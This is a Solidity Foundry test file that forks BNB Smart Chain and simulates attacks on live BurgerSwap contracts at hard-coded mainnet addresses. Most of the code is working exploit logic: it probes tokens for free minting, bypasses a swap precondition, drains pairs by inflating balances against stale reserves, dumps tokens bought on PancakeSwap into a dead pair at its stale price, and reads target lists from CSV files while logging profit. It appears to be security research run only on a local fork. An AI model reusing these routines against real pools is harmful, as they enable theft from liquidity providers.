// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {IERC20, IDemaxFactory, IDemaxPair, IDemaxPlatform, IDemaxPool, IDemaxGovernance, IDemaxConfig, IPancakeRouter} from "../src/Interfaces.sol";
import {MockMintable} from "../src/MockMintable.sol";

/// @title BurgerSwap (BSC) live-extractability fork tests
/// @notice Read-only: runs against a throwaway fork of BSC. Nothing is broadcast.
///         Attacker = an unprivileged EOA/contract with no roles anywhere.
contract BurgerSwapLiveTest is Test {
    address constant FACTORY = 0x8a1E9d3aEbBBd5bA2A64d3355A48dD5E9b511256;
    address constant PLATFORM = 0xB099D7dbC415bf5491B0ca6fdCcFddF8b7EDCE12;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant POOL = 0x86A327715d707BCa24983b1145D1F6c40C5d4A74;
    address constant GOVERNANCE = 0x9154c2684aeF8d106babcB19Aa81d4FabF7581ec;
    address constant PAIR_WBNB_BUSD = 0xA5E6519E1623547B7C6b1eC8f0f4F918bBAcE5dd;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant BURGER_WBNB_PAIR = 0x7ac55ac530f2C29659573Bde0700c6758D69e677;

    uint256 forkBlock;
    address internal ATTACKER;

    function setUp() public {
        string memory rpc = vm.envOr("BSC_RPC_URL", string("https://bsc-rpc.publicnode.com"));
        forkBlock = vm.createSelectFork(rpc);
        ATTACKER = makeAddr("burgerswapAttacker");
    }

    // ------------------------------------------------------------------ helpers

    function _reserves(address pair) internal view returns (uint256 r0, uint256 r1) {
        (uint112 a, uint112 b,) = IDemaxPair(pair).getReserves();
        return (uint256(a), uint256(b));
    }

    /// @dev balance of `token` held by `pair`, DGAS-adjusted (pair excludes remainReward from reserves)
    function _adjBalance(address pair, address token) internal view returns (uint256) {
        uint256 b = IERC20(token).balanceOf(pair);
        if (token == BURGER) {
            uint256 rem = IDemaxPair(pair).remainReward();
            b = b > rem ? b - rem : 0;
        }
        return b;
    }

    function _excess(address pair) internal view returns (address t0, address t1, uint256 e0, uint256 e1) {
        t0 = IDemaxPair(pair).token0();
        t1 = IDemaxPair(pair).token1();
        (uint256 r0, uint256 r1) = _reserves(pair);
        uint256 b0 = _adjBalance(pair, t0);
        uint256 b1 = _adjBalance(pair, t1);
        e0 = b0 > r0 ? b0 - r0 : 0;
        e1 = b1 > r1 ? b1 - r1 : 0;
    }

    /// @dev Try the common public-mint entry points from an unprivileged caller.
    ///      MUST be called with the attacker as msg.sender (vm.prank).
    ///      Returns the amount actually minted to `to` (0 = not freely mintable).
    function _probeMint(address token, address to, uint256 amount) internal returns (uint256 minted) {
        uint256 before = IERC20(token).balanceOf(to);
        // mint(address,uint256)
        (bool s,) = token.call(abi.encodeWithSelector(0x40c10f19, to, amount));
        if (s && IERC20(token).balanceOf(to) > before) return IERC20(token).balanceOf(to) - before;
        // mint(uint256)
        (s,) = token.call(abi.encodeWithSelector(0xa0712d68, amount));
        if (s && IERC20(token).balanceOf(to) > before) return IERC20(token).balanceOf(to) - before;
        // mint()
        (s,) = token.call(abi.encodeWithSelector(0x1249c58b));
        if (s && IERC20(token).balanceOf(to) > before) return IERC20(token).balanceOf(to) - before;
        // mint(address)
        (s,) = token.call(abi.encodeWithSelector(0x6a627842, to));
        if (s && IERC20(token).balanceOf(to) > before) return IERC20(token).balanceOf(to) - before;
        // mintTo(address,uint256)
        (s,) = token.call(abi.encodeWithSelector(0x449a52f8, to, amount));
        if (s && IERC20(token).balanceOf(to) > before) return IERC20(token).balanceOf(to) - before;
        // print(address,uint256)
        (s,) = token.call(abi.encodeWithSelector(0xac685539, to, amount));
        if (s && IERC20(token).balanceOf(to) > before) return IERC20(token).balanceOf(to) - before;
        return 0;
    }

    /// @dev make swapPrecondition(mal) true: mal needs a BURGER pair holding >=0.2004%
    ///      of the mal/WBNB pair's WBNB value in BURGER terms. Executed as ATTACKER.
    ///      Returns the WBNB spent on the BURGER bypass (0 if the gate already passes).
    function _ensurePrecondition(address mal) internal returns (uint256 wbnbSpent) {
        address atk = ATTACKER;
        if (IDemaxPlatform(PLATFORM).swapPrecondition(mal)) return 0;
        address wpair = IDemaxFactory(FACTORY).getPair(WBNB, mal);
        if (wpair == address(0)) return 0;
        (uint256 rw0, uint256 rw1) = _reserves(wpair);
        uint256 wethReserve = IDemaxPair(wpair).token0() == WBNB ? rw0 : rw1;
        (uint256 rb0, uint256 rb1) = _reserves(BURGER_WBNB_PAIR);
        uint256 rwbnb = IDemaxPair(BURGER_WBNB_PAIR).token0() == WBNB ? rb0 : rb1;
        uint256 rburger = IDemaxPair(BURGER_WBNB_PAIR).token0() == BURGER ? rb0 : rb1;
        if (rwbnb == 0) return 0;
        // required BURGER-side value in the mal/BURGER pair (WBNB terms)
        uint256 needValue = wethReserve * 2004 / 1_000_000 + 1;
        uint256 needBurger = needValue * rburger / rwbnb * 210 / 100 + 1;
        // NOTE: buying BURGER through the platform reverts (the DemaxTransferListener tries to
        // update productivity on the BURGER/WBNB pair but is not the DGAS impl -> FORBIDDEN).
        // The attacker therefore sources BURGER elsewhere (PancakeSwap/own capital); we deal it
        // on the fork and charge its WBNB market value as the bypass cost.
        deal(BURGER, atk, IERC20(BURGER).balanceOf(atk) + needBurger);
        wbnbSpent = needBurger * rwbnb / rburger;
        vm.startPrank(atk);
        // create / top up the mal/BURGER pair until the gate passes
        address bpair = IDemaxFactory(FACTORY).getPair(BURGER, mal);
        if (bpair == address(0)) {
            uint256 malAmt = IERC20(mal).balanceOf(atk) / 100;
            uint256 burger = IERC20(BURGER).balanceOf(atk);
            if (malAmt > 0 && burger > 0) {
                IERC20(mal).approve(PLATFORM, malAmt);
                IERC20(BURGER).approve(PLATFORM, burger);
                try IDemaxPlatform(PLATFORM).addLiquidity(mal, BURGER, malAmt, burger, 0, 0, block.timestamp + 1) {} catch {}
            }
            bpair = IDemaxFactory(FACTORY).getPair(BURGER, mal);
        }
        for (uint256 i = 0; i < 6 && !IDemaxPlatform(PLATFORM).swapPrecondition(mal); i++) {
            uint256 b = IERC20(BURGER).balanceOf(atk);
            if (b == 0 || bpair == address(0)) break;
            IERC20(BURGER).transfer(bpair, b);
            try IDemaxPair(bpair).sync() {} catch {}
            bpair = IDemaxFactory(FACTORY).getPair(BURGER, mal);
        }
        vm.stopPrank();
    }

    /// @dev balance-inflation attack: mint free `mal` (as ATTACKER), inflate the target
    ///      pair's MAL balance *without* sync (the platform prices on stale reserves),
    ///      then swap `mal` -> `real`.
    function _drain(address pair, address mal, address real)
        internal
        returns (uint256 realOut, string memory note)
    {
        address atk = ATTACKER;
        if (IERC20(mal).balanceOf(atk) == 0) {
            vm.prank(atk);
            uint256 minted = _probeMint(mal, atk, 1e30);
            if (minted == 0) return (0, "not freely mintable from unprivileged caller");
        }
        if (!IDemaxPlatform(PLATFORM).swapPrecondition(real)) return (0, "output token blocked by swapPrecondition");
        uint256 bypassCost = _ensurePrecondition(mal);
        if (!IDemaxPlatform(PLATFORM).swapPrecondition(mal)) {
            return (0, "input token blocked by swapPrecondition (could not fix)");
        }
        address t0 = IDemaxPair(pair).token0();
        (uint256 r0, uint256 r1) = _reserves(pair);
        uint256 rMal = t0 == mal ? r0 : r1;
        if (rMal == 0) return (0, "mal reserve is zero (stale-reserve route unavailable)");
        uint256 bal = IERC20(mal).balanceOf(atk);
        vm.startPrank(atk);
        // inflate the pair's mal balance (no sync) -> k-check becomes trivially satisfiable
        uint256 sendAmt = bal / 2;
        (bool okT,) = mal.call(abi.encodeWithSelector(0xa9059cbb, pair, sendAmt));
        if (!okT) {
            vm.stopPrank();
            return (0, "mal transfer to pair failed");
        }
        uint256 inAmt = bal - sendAmt;
        if (inAmt > 100 * rMal) inAmt = 100 * rMal;
        if (inAmt == 0) {
            vm.stopPrank();
            return (0, "no swap input left");
        }
        IERC20(mal).approve(PLATFORM, inAmt);
        address[] memory path = new address[](2);
        path[0] = mal;
        path[1] = real;
        uint256 before = IERC20(real).balanceOf(atk);
        try IDemaxPlatform(PLATFORM).swapExactTokensForTokens(inAmt, 0, path, atk, block.timestamp + 1) {
            realOut = IERC20(real).balanceOf(atk) - before;
            note = "ok (stale-reserve balance inflation)";
        } catch {
            vm.stopPrank();
            return (0, "swap reverted");
        }
        vm.stopPrank();
        if (bypassCost > 0) {
            emit log_named_uint("drain_bypass_wbnb_cost", bypassCost);
        }
    }

    // ------------------------------------------------------------------ tests

    /// Positive control: the stale-reserve balance-inflation path IS exploitable
    /// by an unprivileged attacker whenever one side of a pair is freely mintable.
    /// No live BurgerSwap token qualifies today (see test_07); this test proves the
    /// mechanism end-to-end with a mock token and a third-party LP (victim).
    function test_08_mechanism_positive_control() public {
        MockMintable mal = new MockMintable();
        address victim = makeAddr("controlVictim");
        // victim seeds MAL/WBNB pair with real WBNB value (permissionless via platform)
        deal(WBNB, victim, 1e18);
        mal.mint(victim, 1e21);
        vm.startPrank(victim);
        IERC20(WBNB).approve(PLATFORM, type(uint256).max);
        mal.approve(PLATFORM, type(uint256).max);
        IDemaxPlatform(PLATFORM).addLiquidity(address(mal), WBNB, 1e21, 1e18, 0, 0, block.timestamp + 1);
        vm.stopPrank();
        address pair = IDemaxFactory(FACTORY).getPair(address(mal), WBNB);
        emit log_named_address("control_pair", pair);
        (uint256 r0, uint256 r1) = _reserves(pair);
        emit log_named_uint("control_reserve0", r0);
        emit log_named_uint("control_reserve1", r1);
        // attacker (fresh address, no privileges, no balances) mints MAL for free and drains WBNB
        mal.mint(ATTACKER, 1e30);
        uint256 wbnbBefore = IERC20(WBNB).balanceOf(ATTACKER);
        (uint256 wbnbOut, string memory note) = _drain(pair, address(mal), WBNB);
        uint256 wbnbAfter = IERC20(WBNB).balanceOf(ATTACKER);
        emit log_named_uint("control_wbnb_out", wbnbOut);
        emit log_named_uint("control_attacker_wbnb_delta", wbnbAfter - wbnbBefore);
        emit log_named_string("control_note", note);
        // the victim's real side is extractable by an unprivileged attacker
        assertGt(wbnbOut, 0.5e18, "mechanism must extract the real side");
        assertEq(wbnbAfter - wbnbBefore, wbnbOut, "no WBNB spent by attacker");
    }

    /// H-O evidence: the LP redemption path is live and unpaused - a fresh LP can
    /// add liquidity to the top funded pair and immediately burn for the pro-rata share.
    function test_09_lp_redeem_path_live() public {
        address lp = makeAddr("redeemLp");
        deal(WBNB, lp, 1e18);
        deal(BUSD, lp, 1000e18);
        vm.startPrank(lp);
        IERC20(WBNB).approve(PLATFORM, type(uint256).max);
        IERC20(BUSD).approve(PLATFORM, type(uint256).max);
        (uint256 in0, uint256 in1, uint256 liq) =
            IDemaxPlatform(PLATFORM).addLiquidity(WBNB, BUSD, 1e18, 1000e18, 0, 0, block.timestamp + 1);
        vm.roll(block.number + 1);
        (uint256 out0, uint256 out1) =
            IDemaxPlatform(PLATFORM).removeLiquidity(WBNB, BUSD, liq, 0, 0, lp, block.timestamp + 1);
        vm.stopPrank();
        emit log_named_uint("redeem_lp_added_wbnb", in0);
        emit log_named_uint("redeem_lp_added_busd", in1);
        emit log_named_uint("redeem_lp_got_wbnb", out0);
        emit log_named_uint("redeem_lp_got_busd", out1);
        assertGt(out0, in0 * 99 / 100, "redemption path must be live");
        assertGt(out1, in1 * 99 / 100, "redemption path must be live");
    }

    /// Live stale-price dump: buy the stale side on PancakeSwap, dump it into the
    /// dead BurgerSwap pair at the pair's stale implied price, realise WBNB.
    /// Targets come from ci/pancake_arb.py (test/dump_targets.csv).
    function test_10_stale_price_dump_live() public {
        if (!vm.exists("test/dump_targets.csv")) {
            emit log("test/dump_targets.csv missing - skipping");
            return;
        }
        string[] memory lines = _splitLines(vm.readFile("test/dump_targets.csv"));
        uint256 idx;
        for (uint256 li = 0; li < lines.length && idx < 3; li++) {
            string memory line = lines[li];
            if (bytes(line).length == 0) continue;
            (address pair, address mal, address real, uint256 x) = _parseDumpLine(line);
            if (pair == address(0) || real != WBNB || x == 0) continue;
            idx++;
            _staleDump(pair, mal, x);
        }
    }

    function _staleDump(address pair, address mal, uint256 x) internal {
        address attacker = makeAddr(string.concat("dumper", vm.toString(mal)));
        // flash-loan-sized WBNB budget for the PoC
        deal(WBNB, attacker, 500e18);
        vm.startPrank(attacker);
        IERC20(WBNB).approve(PANCAKE_ROUTER, type(uint256).max);
        IERC20(WBNB).approve(PLATFORM, type(uint256).max);
        uint256 wbnbStart = IERC20(WBNB).balanceOf(attacker);
        // 1) buy x of mal on PancakeSwap
        address[] memory buyPath = new address[](2);
        buyPath[0] = WBNB;
        buyPath[1] = mal;
        uint256[] memory amountsIn = IPancakeRouter(PANCAKE_ROUTER).getAmountsIn(x, buyPath);
        uint256 wbnbCost = amountsIn[0];
        if (wbnbCost > 400e18) {
            vm.stopPrank();
            emit log_named_uint("dump_skipped_too_expensive", wbnbCost);
            return;
        }
        try IPancakeRouter(PANCAKE_ROUTER).swapTokensForExactTokens(
            x, wbnbCost * 105 / 100, buyPath, attacker, block.timestamp + 1
        ) {} catch {
            vm.stopPrank();
            emit log_named_address("dump_pair", pair);
            emit log_named_address("dump_mal", mal);
            emit log("pancake buy reverted (no liquidity / honeypot)");
            return;
        }
        uint256 malGot = IERC20(mal).balanceOf(attacker);
        // 2) make sure the input token passes the platform's swapPrecondition
        vm.stopPrank();
        uint256 burgerCost;
        if (!IDemaxPlatform(PLATFORM).swapPrecondition(mal)) {
            burgerCost = _ensurePrecondition(mal);
        }
        vm.startPrank(attacker);
        // 3) dump mal into the dead BurgerSwap pair
        address[] memory dumpPath = new address[](2);
        dumpPath[0] = mal;
        dumpPath[1] = WBNB;
        uint256 malDump = IERC20(mal).balanceOf(attacker);
        IERC20(mal).approve(PLATFORM, malDump);
        uint256[] memory quoted = IDemaxPlatform(PLATFORM).getAmountsOut(malDump, dumpPath);
        uint256 wbnbBeforeDump = IERC20(WBNB).balanceOf(attacker);
        try IDemaxPlatform(PLATFORM).swapExactTokensForTokens(malDump, quoted[1] * 95 / 100, dumpPath, attacker, block.timestamp + 1) {
        } catch {
            vm.stopPrank();
            emit log_named_address("dump_pair", pair);
            emit log_named_address("dump_mal", mal);
            emit log("dump swap reverted");
            return;
        }
        uint256 wbnbAfterDump = IERC20(WBNB).balanceOf(attacker);
        vm.stopPrank();
        emit log_named_address("dump_pair", pair);
        emit log_named_address("dump_mal", mal);
        emit log_named_uint("dump_x_requested", x);
        emit log_named_uint("dump_mal_received", malGot);
        emit log_named_uint("dump_mal_dumped", malDump);
        emit log_named_uint("dump_wbnb_cost_mal", wbnbCost);
        emit log_named_uint("dump_wbnb_cost_burger_bypass", burgerCost);
        emit log_named_uint("dump_wbnb_out", wbnbAfterDump - wbnbBeforeDump);
        emit log_named_int("dump_net_wbnb", int256(wbnbAfterDump) - int256(wbnbStart) - int256(burgerCost));
        emit log("----");
    }

    function test_11_burger_pair_swap_gate() public {
        // The DemaxTransferListener (0x3BecD052...) tries to update the BURGER/WBNB pair's
        // productivity on every DGAS transfer to/from a pair, but it is not the DGAS `impl`
        // (0x54a1Ca2...) -> the token reverts FORBIDDEN. This documents whether swaps that
        // touch weighted BURGER pairs are bricked.
        address atk = makeAddr("burgerSwapProbe");
        deal(WBNB, atk, 1e18);
        vm.startPrank(atk);
        IERC20(WBNB).approve(PLATFORM, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = BURGER;
        try IDemaxPlatform(PLATFORM).swapExactTokensForTokens(1e16, 0, path, atk, block.timestamp + 1) {
            emit log("WBNB->BURGER swap: SUCCESS");
        } catch Error(string memory reason) {
            emit log_named_string("WBNB->BURGER swap revert reason", reason);
        } catch (bytes memory) {
            emit log("WBNB->BURGER swap: reverted (no reason)");
        }
        // control: a normal non-BURGER pair swap works
        path[1] = USDT;
        try IDemaxPlatform(PLATFORM).swapExactTokensForTokens(1e16, 0, path, atk, block.timestamp + 1) {
            emit log("WBNB->USDT swap: SUCCESS");
        } catch Error(string memory reason) {
            emit log_named_string("WBNB->USDT swap revert reason", reason);
        } catch (bytes memory) {
            emit log("WBNB->USDT swap: reverted (no reason)");
        }
        vm.stopPrank();
    }

    function test_00_state_sanity() public {
        uint256 n = IDemaxFactory(FACTORY).allPairsLength();
        emit log_named_uint("fork_block", forkBlock);
        emit log_named_uint("allPairsLength", n);
        emit log_named_uint("platform_isPause", IDemaxPlatform(PLATFORM).isPause() ? 1 : 0);
        emit log_named_address("platform_owner", IDemaxPlatform(PLATFORM).owner());
        emit log_named_uint("burger_totalSupply", IERC20(BURGER).totalSupply());
        emit log_named_uint("burger_in_token_contract", IERC20(BURGER).balanceOf(BURGER));
        emit log_named_uint("governance_burger", IERC20(BURGER).balanceOf(GOVERNANCE));
        emit log_named_uint("pool_burger", IERC20(BURGER).balanceOf(POOL));
        (uint256 r0, uint256 r1) = _reserves(PAIR_WBNB_BUSD);
        emit log_named_uint("top_pair_reserve0_WBNB", r0);
        emit log_named_uint("top_pair_reserve1_BUSD", r1);
        emit log_named_uint("top_pair_bal0", _adjBalance(PAIR_WBNB_BUSD, WBNB));
        emit log_named_uint("top_pair_bal1", _adjBalance(PAIR_WBNB_BUSD, BUSD));
        emit log_named_uint("top_pair_lp_totalSupply", IDemaxPair(PAIR_WBNB_BUSD).totalSupply());
    }

    function test_01_gates_pair_swap_is_platform_only() public {
        address attacker = makeAddr("attacker1");
        vm.prank(attacker);
        vm.expectRevert();
        IDemaxPair(PAIR_WBNB_BUSD).swap(0, 1, attacker, "");
    }

    function test_02_gates_mintReward_needs_productivity() public {
        address attacker = makeAddr("attacker2");
        vm.prank(attacker);
        vm.expectRevert(bytes("NOTHING TO MINT"));
        IDemaxPair(PAIR_WBNB_BUSD).mintReward();
    }

    function test_03_gates_pool_claim_needs_lp() public {
        address attacker = makeAddr("attacker3");
        vm.prank(attacker);
        vm.expectRevert(bytes("NOTHING TO MINT"));
        IDemaxPool(POOL).claimReward(PAIR_WBNB_BUSD, BURGER);
    }

    function test_04_gates_governance_receiveReward_needs_allowance() public {
        address attacker = makeAddr("attacker4");
        address victim = makeAddr("victim4");
        deal(BURGER, victim, 1e18);
        vm.prank(attacker);
        vm.expectRevert();
        IDemaxGovernance(GOVERNANCE).receiveReward(victim, 1e18);
    }

    function test_05_bluechip_roundtrip_loses_fees() public {
        // No free lunch on a normal pair: WBNB -> BUSD -> WBNB round trip must lose money.
        address attacker = makeAddr("attacker5");
        deal(WBNB, attacker, 10e18);
        vm.startPrank(attacker);
        IERC20(WBNB).approve(PLATFORM, type(uint256).max);
        address[] memory p1 = new address[](2);
        p1[0] = WBNB;
        p1[1] = BUSD;
        uint256 wbnbBefore = IERC20(WBNB).balanceOf(attacker);
        IDemaxPlatform(PLATFORM).swapExactTokensForTokens(1e18, 0, p1, attacker, block.timestamp + 1);
        uint256 busdGot = IERC20(BUSD).balanceOf(attacker);
        IERC20(BUSD).approve(PLATFORM, type(uint256).max);
        address[] memory p2 = new address[](2);
        p2[0] = BUSD;
        p2[1] = WBNB;
        IDemaxPlatform(PLATFORM).swapExactTokensForTokens(busdGot, 0, p2, attacker, block.timestamp + 1);
        uint256 wbnbAfter = IERC20(WBNB).balanceOf(attacker);
        vm.stopPrank();
        emit log_named_uint("wbnb_spent", wbnbBefore);
        emit log_named_uint("wbnb_returned", wbnbAfter);
        assertLt(wbnbAfter, wbnbBefore, "round trip must lose the 0.6% fee");
    }

    /// Excess (balance - reserve) dilution: add liquidity at the reserve ratio, then burn.
    /// A new LP captures a pro-rata slice of any excess balances for free.
    function test_06_excess_dilution() public {
        if (!vm.exists("test/excess.csv")) {
            emit log("test/excess.csv missing - skipping");
            return;
        }
        string[] memory lines = _splitLines(vm.readFile("test/excess.csv"));
        for (uint256 li = 0; li < lines.length; li++) {
            string memory line = lines[li];
            if (bytes(line).length == 0) continue;
            (address pair, uint256 usdExcess) = _parseExcessLine(line);
            if (pair == address(0) || usdExcess < 1) continue;
            (address t0, address t1, uint256 e0, uint256 e1) = _excess(pair);
            if (e0 == 0 && e1 == 0) continue;
            (uint256 r0, uint256 r1) = _reserves(pair);
            address attacker = makeAddr(string.concat("exAttacker", vm.toString(pair)));
            uint256 k = 20;
            deal(t0, attacker, r0 * k);
            deal(t1, attacker, r1 * k);
            vm.startPrank(attacker);
            IERC20(t0).approve(PLATFORM, type(uint256).max);
            IERC20(t1).approve(PLATFORM, type(uint256).max);
            (uint256 in0, uint256 in1, uint256 liq) =
                IDemaxPlatform(PLATFORM).addLiquidity(t0, t1, r0 * k, r1 * k, 0, 0, block.timestamp + 1);
            vm.roll(block.number + 1);
            (uint256 out0, uint256 out1) =
                IDemaxPlatform(PLATFORM).removeLiquidity(t0, t1, liq, 0, 0, attacker, block.timestamp + 1);
            vm.stopPrank();
            emit log_named_address("excess_pair", pair);
            emit log_named_uint("excess_e0", e0);
            emit log_named_uint("excess_e1", e1);
            emit log_named_uint("deposited0", in0);
            emit log_named_uint("withdrawn0", out0);
            emit log_named_uint("deposited1", in1);
            emit log_named_uint("withdrawn1", out1);
            emit log_named_uint("profit0", out0 > in0 ? out0 - in0 : 0);
            emit log_named_uint("profit1", out1 > in1 ? out1 - in1 : 0);
            emit log("----");
        }
    }

    /// Balance-inflation attack on candidate pairs (mintable token + valuable counterpart).
    function test_07_drain_candidates() public {
        if (!vm.exists("test/drain.csv")) {
            emit log("test/drain.csv missing - skipping");
            return;
        }
        string[] memory lines = _splitLines(vm.readFile("test/drain.csv"));
        uint256 idx;
        for (uint256 li = 0; li < lines.length && idx < 12; li++) {
            string memory line = lines[li];
            if (bytes(line).length == 0) continue;
            (address pair, address mal, address real) = _parseDrainLine(line);
            if (pair == address(0)) continue;
            idx++;
            (uint256 realOut, string memory note) = _drain(pair, mal, real);
            emit log_named_uint("drain_idx", idx);
            emit log_named_address("drain_pair", pair);
            emit log_named_address("drain_mal", mal);
            emit log_named_address("drain_real", real);
            emit log_named_uint("drain_realOut", realOut);
            emit log_named_string("drain_note", note);
            emit log("----");
        }
    }

    // ------------------------------------------------------------------ csv parsing

    function _splitLines(string memory s) internal pure returns (string[] memory out) {
        bytes memory b = bytes(s);
        uint256 n = 1;
        for (uint256 i = 0; i < b.length; i++) {
            if (b[i] == 0x0a) n++;
        }
        out = new string[](n);
        uint256 start = 0;
        uint256 idx = 0;
        for (uint256 i = 0; i <= b.length; i++) {
            if (i == b.length || b[i] == 0x0a) {
                bytes memory line = new bytes(i - start);
                for (uint256 j = start; j < i; j++) {
                    line[j - start] = b[j] == 0x0d ? bytes1(0) : b[j];
                }
                out[idx++] = string(line);
                start = i + 1;
            }
        }
    }

    function _parseExcessLine(string memory line) internal pure returns (address pair, uint256 usd) {
        bytes memory b = bytes(line);
        uint256 comma1;
        uint256 comma2;
        uint256 comma3;
        uint256 found;
        for (uint256 i = 0; i < b.length; i++) {
            if (b[i] == 0x2c) {
                found++;
                if (found == 1) comma1 = i;
                else if (found == 2) comma2 = i;
                else if (found == 3) comma3 = i;
            }
        }
        if (found < 3) return (address(0), 0);
        pair = _toAddress(_slice(b, 0, comma1));
        bytes memory usdPart = _slice(b, comma3 + 1, b.length);
        usd = _toUint(usdPart);
    }

    function _parseDrainLine(string memory line) internal pure returns (address pair, address mal, address real) {
        bytes memory b = bytes(line);
        uint256 comma1;
        uint256 comma2;
        uint256 found;
        for (uint256 i = 0; i < b.length; i++) {
            if (b[i] == 0x2c) {
                found++;
                if (found == 1) comma1 = i;
                else if (found == 2) comma2 = i;
            }
        }
        if (found < 2) return (address(0), address(0), address(0));
        pair = _toAddress(_slice(b, 0, comma1));
        mal = _toAddress(_slice(b, comma1 + 1, comma2));
        real = _toAddress(_slice(b, comma2 + 1, b.length));
    }

    function _parseDumpLine(string memory line)
        internal
        pure
        returns (address pair, address mal, address real, uint256 x)
    {
        bytes memory b = bytes(line);
        uint256[4] memory c;
        uint256 found;
        for (uint256 i = 0; i < b.length; i++) {
            if (b[i] == 0x2c) {
                if (found < 4) c[found] = i;
                found++;
            }
        }
        if (found < 4) return (address(0), address(0), address(0), 0);
        pair = _toAddress(_slice(b, 0, c[0]));
        mal = _toAddress(_slice(b, c[0] + 1, c[1]));
        real = _toAddress(_slice(b, c[1] + 1, c[2]));
        x = _toUint(_slice(b, c[2] + 1, c[3]));
    }

    function _slice(bytes memory b, uint256 start, uint256 end) internal pure returns (bytes memory out) {
        out = new bytes(end - start);
        for (uint256 i = start; i < end; i++) out[i - start] = b[i];
    }

    function _toAddress(bytes memory b) internal pure returns (address a) {
        // expects 0x + 40 hex chars
        if (b.length < 42) return address(0);
        uint160 v;
        for (uint256 i = 2; i < 42; i++) {
            uint8 c = uint8(b[i]);
            uint8 d;
            if (c >= 48 && c <= 57) d = c - 48;
            else if (c >= 97 && c <= 102) d = c - 87;
            else if (c >= 65 && c <= 70) d = c - 55;
            else return address(0);
            v = v * 16 + d;
        }
        a = address(v);
    }

    function _toUint(bytes memory b) internal pure returns (uint256 v) {
        for (uint256 i = 0; i < b.length; i++) {
            uint8 c = uint8(b[i]);
            if (c == 0x2e) break; // stop at decimal point
            if (c == 0x0d || c == 0x0a) break;
            if (c < 48 || c > 57) continue;
            v = v * 10 + (c - 48);
        }
    }
}
